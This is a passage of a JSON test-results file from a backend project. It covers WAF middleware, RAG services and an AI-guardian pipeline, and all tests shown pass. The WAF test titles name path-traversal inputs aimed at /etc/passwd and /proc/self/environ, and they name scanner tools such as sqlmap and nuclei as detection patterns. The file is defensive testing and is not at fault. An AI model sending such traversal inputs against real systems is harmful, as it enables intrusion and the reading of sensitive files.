....//....//....//etc/passwd","status":"passed","title":"should detect path traversal: ....//....//....//etc/passwd","duration":0.25039999999995644,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Path Traversal Detection"],"fullName":"Path Traversal Detection should detect path traversal: /etc/passwd","status":"passed","title":"should detect path traversal: /etc/passwd","duration":0.2506999999999948,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Path Traversal Detection"],"fullName":"Path Traversal Detection should detect path traversal: /proc/self/environ","status":"passed","title":"should detect path traversal: /proc/self/environ","duration":0.23649999999997817,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Path Traversal Detection"],"fullName":"Path Traversal Detection should detect path traversal: C:\\Windows\\System32\\","status":"passed","title":"should detect path traversal: C:\\Windows\\System32\\","duration":0.2966999999999871,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Bot Detection"],"fullName":"Bot Detection should detect malicious bot: sqlmap/1.0","status":"passed","title":"should detect malicious bot: sqlmap/1.0","duration":0.22939999999999827,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Bot Detection"],"fullName":"Bot Detection should detect malicious bot: Nikto/2.1.5","status":"passed","title":"should detect malicious bot: Nikto/2.1.5","duration":0.13150000000001683,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Bot Detection"],"fullName":"Bot Detection should detect malicious bot: nmap scripting engine","status":"passed","title":"should detect malicious bot: nmap scripting engine","duration":0.116800000000012,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Bot Detection"],"fullName":"Bot Detection should detect malicious bot: masscan/1.0","status":"passed","title":"should detect malicious bot: masscan/1.0","duration":0.11529999999999063,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Bot Detection"],"fullName":"Bot Detection should detect malicious bot: gobuster/3.1","status":"passed","title":"should detect malicious bot: gobuster/3.1","duration":0.383199999999988,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Bot Detection"],"fullName":"Bot Detection should detect malicious bot: nuclei/2.0","status":"passed","title":"should detect malicious bot: nuclei/2.0","duration":0.2968000000000188,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["IP Blocking"],"fullName":"IP Blocking should block blacklisted IPs","status":"passed","title":"should block blacklisted IPs","duration":0.35259999999999536,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["IP Blocking"],"fullName":"IP Blocking should unblock IPs correctly","status":"passed","title":"should unblock IPs correctly","duration":0.3032000000000039,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["IP Blocking"],"fullName":"IP Blocking should return blocked IPs list","status":"passed","title":"should return blocked IPs list","duration":0.5697000000000116,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Rate Limiting"],"fullName":"Rate Limiting should enforce rate limits","status":"passed","title":"should enforce rate limits","duration":0.4187000000000012,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Rate Limiting"],"fullName":"Rate Limiting should clear rate limit for specific IP","status":"passed","title":"should clear rate limit for specific IP","duration":1.2849999999999682,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Custom Rules"],"fullName":"Custom Rules should add and enforce custom rules","status":"passed","title":"should add and enforce custom rules","duration":0.6435000000000173,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Custom Rules"],"fullName":"Custom Rules should remove custom rules","status":"passed","title":"should remove custom rules","duration":0.3815999999999917,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Monitor Mode"],"fullName":"Monitor Mode should log but not block in monitor mode","status":"passed","title":"should log but not block in monitor mode","duration":0.3369000000000142,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["WAF Events and Stats"],"fullName":"WAF Events and Stats should record WAF events","status":"passed","title":"should record WAF events","duration":0.40320000000002665,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["WAF Events and Stats"],"fullName":"WAF Events and Stats should provide WAF statistics","status":"passed","title":"should provide WAF statistics","duration":0.6165000000000305,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Configuration Management"],"fullName":"Configuration Management should update WAF configuration","status":"passed","title":"should update WAF configuration","duration":0.19900000000001228,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Configuration Management"],"fullName":"Configuration Management should reset to default configuration","status":"passed","title":"should reset to default configuration","duration":0.12239999999997053,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Pattern Validation"],"fullName":"Pattern Validation should have valid SQL injection patterns","status":"passed","title":"should have valid SQL injection patterns","duration":0.35899999999998045,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Pattern Validation"],"fullName":"Pattern Validation should have valid XSS patterns","status":"passed","title":"should have valid XSS patterns","duration":0.25420000000002574,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Pattern Validation"],"fullName":"Pattern Validation should have valid command injection patterns","status":"passed","title":"should have valid command injection patterns","duration":0.08899999999999864,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Pattern Validation"],"fullName":"Pattern Validation should have valid path traversal patterns","status":"passed","title":"should have valid path traversal patterns","duration":0.07240000000001601,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Edge Cases"],"fullName":"Edge Cases should handle empty request body","status":"passed","title":"should handle empty request body","duration":0.16460000000000719,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Edge Cases"],"fullName":"Edge Cases should handle null/undefined values","status":"passed","title":"should handle null/undefined values","duration":0.1501999999999839,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Edge Cases"],"fullName":"Edge Cases should handle very long payloads","status":"passed","title":"should handle very long payloads","duration":0.7649000000000115,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Edge Cases"],"fullName":"Edge Cases should handle X-Forwarded-For header for IP detection","status":"passed","title":"should handle X-Forwarded-For header for IP detection","duration":0.4245000000000232,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["False Positive Prevention"],"fullName":"False Positive Prevention should allow legitimate content: I want to select the best option from the list","status":"passed","title":"should allow legitimate content: I want to select the best option from the list","duration":0.4113999999999578,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["False Positive Prevention"],"fullName":"False Positive Prevention should allow legitimate content: The user dropped their phone","status":"passed","title":"should allow legitimate content: The user dropped their phone","duration":0.3170000000000073,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["False Positive Prevention"],"fullName":"False Positive Prevention should allow legitimate content: Insert the key into the lock","status":"passed","title":"should allow legitimate content: Insert the key into the lock","duration":0.34499999999997044,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["False Positive Prevention"],"fullName":"False Positive Prevention should allow legitimate content: Update your profile settings","status":"passed","title":"should allow legitimate content: Update your profile settings","duration":0.1612999999999829,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["False Positive Prevention"],"fullName":"False Positive Prevention should allow legitimate content: Delete old files from downloads","status":"passed","title":"should allow legitimate content: Delete old files from downloads","duration":0.13630000000000564,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["False Positive Prevention"],"fullName":"False Positive Prevention should allow legitimate content: This is a script for a movie","status":"passed","title":"should allow legitimate content: This is a script for a movie","duration":0.1594000000000051,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["False Positive Prevention"],"fullName":"False Positive Prevention should allow legitimate content: Click here for more information","status":"passed","title":"should allow legitimate content: Click here for more information","duration":0.13700000000000045,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["False Positive Prevention"],"fullName":"False Positive Prevention should allow legitimate content: The image source is correct","status":"passed","title":"should allow legitimate content: The image source is correct","duration":0.148399999999981,"failureMessages":[],"meta":{},"tags":[]}],"startTime":1778420576174,"endTime":1778420576207.1614,"status":"passed","message":"","name":"F:/Claude/Projects/the copy/apps/backend/src/middleware/waf.middleware.test.ts"},{"assertionResults":[{"ancestorTitles":["QueueManager"],"fullName":"QueueManager should create a new queue instance","status":"passed","title":"should create a new queue instance","duration":2.0436000000000263,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["QueueManager"],"fullName":"QueueManager should ret
[...]
,"fullName":"WorldBuilderAgent should expose the current backend configuration","status":"passed","title":"should expose the current backend configuration","duration":1.0927999999998974,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["WorldBuilderAgent"],"fullName":"WorldBuilderAgent should enrich world output with quality metadata","status":"passed","title":"should enrich world output with quality metadata","duration":1.2064000000000306,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["WorldBuilderAgent"],"fullName":"WorldBuilderAgent should return fallback metadata on failure","status":"passed","title":"should return fallback metadata on failure","duration":0.8727999999996428,"failureMessages":[],"meta":{},"tags":[]}],"startTime":1778420649669,"endTime":1778420649672.8728,"status":"passed","message":"","name":"F:/Claude/Projects/the copy/apps/backend/src/services/agents/worldBuilder/WorldBuilderAgent.test.ts"},{"assertionResults":[{"ancestorTitles":["syncScenes performance"],"fullName":"syncScenes performance should optimize syncing of scenes","status":"passed","title":"should optimize syncing of scenes","duration":1.5676000000003114,"failureMessages":[],"meta":{},"tags":[]}],"startTime":1778420678412,"endTime":1778420678413.5676,"status":"passed","message":"","name":"F:/Claude/Projects/the copy/apps/backend/src/services/breakdown/__tests__/service.perf.test.ts"},{"assertionResults":[{"ancestorTitles":["VisualCinematicAnalyzerAgent"],"fullName":"VisualCinematicAnalyzerAgent should expose the current backend configuration","status":"passed","title":"should expose the current backend configuration","duration":1.1131000000000313,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["VisualCinematicAnalyzerAgent"],"fullName":"VisualCinematicAnalyzerAgent should build the visual analysis prompt and normalize the result","status":"passed","title":"should build the visual analysis prompt and normalize the result","duration":0.6137000000003354,"failureMessages":[],"meta":{},"tags":[]}],"startTime":1778420674908,"endTime":1778420674909.6138,"status":"passed","message":"","name":"F:/Claude/Projects/the copy/apps/backend/src/services/agents/visualCinematicAnalyzer/VisualCinematicAnalyzerAgent.test.ts"},{"assertionResults":[{"ancestorTitles":["performRAG"],"fullName":"performRAG should retrieve relevant chunks through unified services","status":"passed","title":"should retrieve relevant chunks through unified services","duration":3.7322000000000344,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["performRAG"],"fullName":"performRAG should return empty for short documents","status":"passed","title":"should return empty for short documents","duration":0.4696999999999889,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["performRAG"],"fullName":"performRAG should filter chunks by relevance threshold","status":"passed","title":"should filter chunks by relevance threshold","duration":0.6687000000000012,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["performRAG"],"fullName":"performRAG should limit number of returned chunks","status":"passed","title":"should limit number of returned chunks","duration":0.37189999999998236,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["performRAG"],"fullName":"performRAG should fail explicitly when indexing fails","status":"passed","title":"should fail explicitly when indexing fails","duration":1.1286999999999807,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["buildAugmentedPrompt"],"fullName":"buildAugmentedPrompt should delegate prompt assembly to the unified context assembler","status":"passed","title":"should delegate prompt assembly to the unified context assembler","duration":0.7882999999999925,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["setOptions and getOptions"],"fullName":"setOptions and getOptions should update options","status":"passed","title":"should update options","duration":0.19360000000000355,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["setOptions and getOptions"],"fullName":"setOptions and getOptions should preserve other options when updating","status":"passed","title":"should preserve other options when updating","duration":0.16800000000000637,"failureMessages":[],"meta":{},"tags":[]}],"startTime":1778420608005,"endTime":1778420608012.1936,"status":"passed","message":"","name":"F:/Claude/Projects/the copy/apps/backend/src/services/rag/__tests__/enhancedRAG.test.ts"},{"assertionResults":[{"ancestorTitles":[],"fullName":"should execute the unified ad hoc pipeline end to end","status":"passed","title":"should execute the unified ad hoc pipeline end to end","duration":3.7532999999999674,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":[],"fullName":"should group semantically related sentences","status":"passed","title":"should group semantically related sentences","duration":0.3429999999999609,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":[],"fullName":"should build complete augmented prompt from unified chunks","status":"passed","title":"should build complete augmented prompt from unified chunks","duration":0.5196000000000254,"failureMessages":[],"meta":{},"tags":[]}],"startTime":1778420636919,"endTime":1778420636923.5195,"status":"passed","message":"","name":"F:/Claude/Projects/the copy/apps/backend/src/services/rag/__tests__/integration.test.ts"},{"assertionResults":[{"ancestorTitles":["SemanticChunker","detectSentenceBoundaries"],"fullName":"SemanticChunker detectSentenceBoundaries should detect Arabic sentence boundaries","status":"passed","title":"should detect Arabic sentence boundaries","duration":1.415300000000002,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["SemanticChunker","detectSentenceBoundaries"],"fullName":"SemanticChunker detectSentenceBoundaries should handle English sentences","status":"passed","title":"should handle English sentences","duration":0.25610000000000355,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["SemanticChunker","detectSentenceBoundaries"],"fullName":"SemanticChunker detectSentenceBoundaries should filter out very short fragments","status":"passed","title":"should filter out very short fragments","duration":0.30239999999997735,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["SemanticChunker","detectSentenceBoundaries"],"fullName":"SemanticChunker detectSentenceBoundaries should handle text without punctuation","status":"passed","title":"should handle text without punctuation","duration":0.18309999999996762,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["SemanticChunker","chunkText"],"fullName":"SemanticChunker chunkText should chunk long text","status":"passed","title":"should chunk long text","duration":1.67349999999999,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["SemanticChunker","chunkText"],"fullName":"SemanticChunker chunkText should return single chunk for short text","status":"passed","title":"should return single chunk for short text","duration":0.20010000000002037,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["SemanticChunker","chunkText"],"fullName":"SemanticChunker chunkText should respect max chunk size","status":"passed","title":"should respect max chunk size","duration":2.2706000000000017,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["SemanticChunker","chunkText"],"fullName":"SemanticChunker chunkText should handle empty text","status":"passed","title":"should handle empty text","duration":0.27480000000002747,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["SemanticChunker","cosineSimilarity"],"fullName":"SemanticChunker cosineSimilarity should calculate cosine similarity correctly","status":"passed","title":"should calculate cosine similarity correctly","duration":0.40699999999998226,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["SemanticChunker","cosineSimilarity"],"fullName":"SemanticChunker cosineSimilarity should return 0 for orthogonal vectors","status":"passed","title":"should return 0 for orthogonal vectors","duration":0.16269999999997253,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["SemanticChunker","cosineSimilarity"],"fullName":"SemanticChunker cosineSimilarity should return 0 for mismatched vector lengths","status":"passed","title":"should return 0 for mismatched vector lengths","duration":0.12439999999998008,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["SemanticChunker","cosineSimilarity"],"fullName":"SemanticChunker cosineSimilarity should handle zero vectors","status":"passed","title":"should handle zero vectors","duration":0.06290000000001328,"failureMessages":[],"meta":{},"tags":[]}],"startTime":1778420603827,"endTime":1778420603835.1245,"status":"passed","message":"","name":"F:/Claude/Projects/the copy/apps/backend/src/services/rag/__tests__/semanticChunker.test.ts"},{"assertionResults":[{"ancestorTitles":["TaskClassifier"],"fullName":"TaskClassifier classifies simple questions as fast","status":"passed","title":"classifies simple questions as fast","duration":3.1193000000000097,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["TaskClassifier"],"fullName":"TaskClassifier classifies research with needs_web and needs_sources","status":"passed","title":"classifies research with needs_web and needs_sources","duration":1.1982000000000426,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["TaskClassifier"],"fullName":"TaskClassifier classifies code tasks with needs_tests","status":"passed","title":"classifies code tasks with needs_tests","duration":0.37479999999999336,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["TaskClassifier"],"fullName":"TaskClassifier classifies destructive actions as high risk","status":"passed","title":"classifies destructive actions as high risk","duration":0.2155999999999949,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["TaskClassifier"],"fullName":"TaskClassifier detects non-exclusive examples","status":"passed","title":"detects non-exclusive examples","duration":0.20050000000003365,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["TaskClassifier"],"fullName":"TaskClassifier detects ambiguous requests","status":"passed","title":"detects ambiguous requests","duration":0.1512000000000171,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["ScopeController"],"fullName":"ScopeController expands scope when user says 'like' with known examples","status":"passed","title":"expands scope when user says 'like' with known examples","duration":0.8418999999999528,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["ScopeController"],"fullName":"ScopeController does not expand when no example terms found","status":"passed","title":"does not expand when no example terms found","duration":0.11330000000003793,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["ScopeController"],"fullName":"ScopeController detects scope collapse in responses","status":"passed","title":"detects scope collapse in responses","duration":0.36350000000004457,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["AssumptionEngine"],"fullName":"AssumptionEngine resolves ambiguity without asking user for reversible actions","status":"passed","title":"resolves ambiguity without asking user for reversible actions","duration":0.8184999999999718,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["AssumptionEngine"],"fullName":"AssumptionEngine asks user for irreversible high-risk actions","status":"passed","title":"asks user for irreversible high-risk actions","duration":0.19580000000001974,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["AssumptionEngine"],"fullName":"AssumptionEngine generates task-specific assumptions for code","status":"passed","title":"generates task-specific assumptions for code","duration":0.4748000000000161,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["SpeedQualityRouter"],"fullName":"SpeedQualityRouter routes simple questions to fast mode","status":"passed","title":"routes simple questions to fast mode","duration":0.26619999999996935,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["SpeedQualityRouter"],"fullName":"SpeedQualityRouter upgrades high-risk tasks to strict mode","status":"passed","title":"upgrades high-risk tasks to strict mode","duration":0.09899999999998954,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["SpeedQualityRouter"],"fullName":"SpeedQualityRouter routes destructive actions to restricted mode","status":"passed","title":"routes destructive actions to restricted mode","duration":0.07439999999996871,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["ToolPolicyProxy"],"fullName":"ToolPolicyProxy denies delete actions by default","status":"passed","title":"denies delete actions by default","duration":0.1742999999999597,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["ToolPolicyProxy"],"fullName":"ToolPolicyProxy allows read actions by default","status":"passed","title":"allows read actions by default","duration":0.32519999999999527,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["ToolPolicyProxy"],"fullName":"ToolPolicyProxy restricts sendEmail to draft_only","status":"passed","title":"restricts sendEmail to draft_only","duration":0.07150000000001455,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["ToolPolicyProxy"],"fullName":"ToolPolicyProxy restricts buyOrPay to recommend_only","status":"passed","title":"restricts buyOrPay to recommend_only","duration":0.04229999999995471,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["ToolPolicyProxy"],"fullName":"ToolPolicyProxy logs tool calls","status":"passed","title":"logs tool calls","duration":0.21410000000003038,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["EvidenceLedger"],"fullName":"EvidenceLedger adds and retrieves claims","status":"passed","title":"adds and retrieves claims","duration":0.27089999999998327,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["EvidenceLedger"],"fullName":"EvidenceLedger detects forbidden claims without evidence","status":"passed","title":"detects forbidden claims without evidence","duration":0.141399999999976,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["EvidenceLedger"],"fullName":"EvidenceLedger validates sources","status":"passed","title":"validates sources","duration":0.11850000000004002,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["EvidenceLedger"],"fullName":"EvidenceLedger detects source laundering","status":"passed","title":"detects source laundering","duration":0.10460000000000491,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["EvidenceLedger"],"fullName":"EvidenceLedger tracks test logs","status":"passed","title":"tracks test logs","duration":0.09619999999995343,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["AutoVerifier"],"fullName":"AutoVerifier passes for clean content","status":"passed","title":"passes for clean content","duration":0.5352000000000317,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["AutoVerifier"],"fullName":"AutoVerifier fails on scope collapse","status":"passed","title":"fails on scope collapse","duration":0.26080000000001746,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["AutoVerifier"],"fullName":"AutoVerifier fails on unsupported claims","status":"passed","title":"fails on unsupported claims","duration":0.134900000000016,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["AutoVerifier"],"fullName":"AutoVerifier fails on sycophancy","status":"passed","title":"fails on sycophancy","duration":0.11329999999998108,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["AutoVerifier"],"fullName":"AutoVerifier fails on unauthorized destructive action","status":"passed","title":"fails on unauthorized destructive action","duration":0.12369999999998527,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["RepairLoop"],"fullName":"RepairLoop generates repair instructions for failures","status":"passed","title":"generates repair instructions for failures","duration":0.15250000000003183,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["RepairLoop"],"fullName":"RepairLoop applies scope collapse repair","status":"passed","title":"applies scope collapse repair","duration":0.12250000000000227,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["RepairLoop"],"fullName":"RepairLoop applies unsupported claims repair","status":"passed","title":"applies unsupported claims repair","duration":0.26420000000001664,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Finalizer"],"fullName":"Finalizer hides internal details by default","status":"passed","title":"hides internal details by default","duration":0.30649999999997135,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Finalizer"],"fullName":"Finalizer includes confidence limits","status":"passed","title":"includes confidence limits","duration":0.10610000000002628,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["Finalizer"],"fullName":"Finalizer includes assumptions when requested","status":"passed","title":"includes assumptions when requested","duration":0.08109999999999218,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["GuardianRuntime"],"fullName":"GuardianRuntime executes full pipeline for simple question","status":"passed","title":"executes full pipeline for simple question","duration":0.6521999999999935,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["GuardianRuntime"],"fullName":"GuardianRuntime refuses irreversible destructive actions","status":"passed","title":"refuses irreversible destructive actions","duration":0.2430999999999699,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["GuardianRuntime"],"fullName":"GuardianRuntime expands scope for non-exclusive examples","status":"passed","title":"expands scope for non-exclusive examples","duration":0.5945000000000391,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["GuardianRuntime"],"fullName":"GuardianRuntime handles errors gracefully","status":"passed","title":"handles errors gracefully","duration":0.28600000000000136,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["GuardianRuntime E2E Scenarios"],"fullName":"GuardianRuntime E2E Scenarios eval: non-exclusive examples scope collapse","status":"passed","title":"eval: non-exclusive examples scope collapse","duration":0.4882000000000062,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["GuardianRuntime E2E Scenarios"],"fullName":"GuardianRuntime E2E Scenarios eval: ambiguous request resolved without user burden","status":"passed","title":"eval: ambiguous request resolved without user burden","duration":0.2966999999999871,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["GuardianRuntime E2E Scenarios"],"fullName":"GuardianRuntime E2E Scenarios eval: untested code claims detected","status":"passed","title":"eval: untested code claims detected","duration":0.39800000000002456,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["GuardianRuntime E2E Scenarios"],"fullName":"GuardianRuntime E2E Scenarios eval: sycophancy detection","status":"passed","title":"eval: sycophancy detection","duration":0.3423999999999978,"failureMessages":[],"meta":{},"tags":[]},{"ancestorTitles":["GuardianRuntime E2E Scenarios"],"fullName":"GuardianRuntime E2E Scenarios eval: unauthorized destructive action blocked","status":"passed","title":"eval: unauthorized destructive action blocked","duration":0.15030000000001564,"failureMessages":[],"meta":{},"tags":[]}],"startTime":1778420579098,"endTime":1778420579115.1504,"status":"passed","message":"","name":"F:/Claude/Projects/the copy/apps/backend/src/services/guardian/__tests__/guardian-runtime.test.ts"}]}